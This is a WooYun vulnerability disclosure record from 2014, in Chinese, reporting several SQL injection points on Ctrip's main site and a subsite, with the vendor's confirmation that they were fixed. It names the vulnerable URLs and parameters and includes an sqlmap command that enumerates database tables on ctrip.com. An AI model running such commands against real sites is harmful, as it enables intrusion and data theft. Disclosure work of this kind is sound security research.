{"id": 1140, "wybug_id": "wooyun-2014-051745", "wybug_title": "携程网主站+分站多个SQL注入漏洞打包", "wybug_corp": "携程旅行网", "wybug_author": "lxj616", "wybug_date": "2014-02-24 11:43", "wybug_open_date": "2014-09-26 12:38", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向公众公开  简要描述： 携程网 主站+分站 多个SQL注入打包重新检测时，发现上一个漏洞已经确认修复但是一方面存在着指哪补哪的节奏，又有分站发现注射，因此打包一起提交了 详细说明：  上次的修补完了（被中划线去掉），这次主站的是红框中的注射地址（SQLMAP轻微注射演示），前两个（打叉号）注射虽然原理上存在，但是在SQLMAP验证时总是失败（因此上次没有一起提交）地址：http://www.ctrip.com/member/signupcode.asp    referer和上次的原理一样，看来是指哪补哪，只把图中第四个注射点补了疑似：/member/cbcard/signupcc_check.asp     sourceid参数      /member/cbcard/signupzh_check.asp     sourceid参数分站： /daijia/r-uc2gt1ad10002-0    travel-way参数\n\n主站注射点验证\nC:\\Users\\Administrator>sqlmap.py -u \"http://www.ctrip.com/member/signupcode.asp\" --referer=\"a\" --level 3 --random-agent --dbms=\"microsoft sql server\" --technique T --tables\n\n\n然后是验证失败的前两个叉号注射点\n\n奇怪的是SQLMAP虽然报告存在注射，也能获取数据库个数，但是没办法获取数据\n\n所以主站实际上确认有第三个所示的漏洞，但是修复时还是3个一起修复了吧分站也有一个疑似注射\n\n一起修复了吧   漏洞证明：  \nC:\\Users\\Administrator>sqlmap.py -u \"http://www.ctrip.com/member/signupcode.asp\" --referer=\"a\" --level 3 --random-agent --dbms=\"microsoft sql server\" --technique T --tables\n\n\n   修复方案：  排查所有文件，不能指哪补哪   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-02-24 13:02 厂商回复： 感谢感谢。 最新状态： 2014-04-01：感谢关注携程安全，漏洞已于2014-2-24当天修复，同时也感谢洞主及时反馈给我们！  ", "replys": "漏洞评价：\n评论\n     2014-02-24 11:24 |    \t\tBincker \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:23        )\t\t \n  携程的洞永远是补不完，安全架构有问题，wooyun 某一个土豪已经在携程内网漫游了快一年了还没被发现。    \n     2014-06-01 20:24 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  wvs啊，我的wvs怎么就没这么强劲呢！    \n     2014-09-26 15:21 |    \t\t卡农的保镖 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 好)\t\t \n  @动后河 因为你跑的站很强劲    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}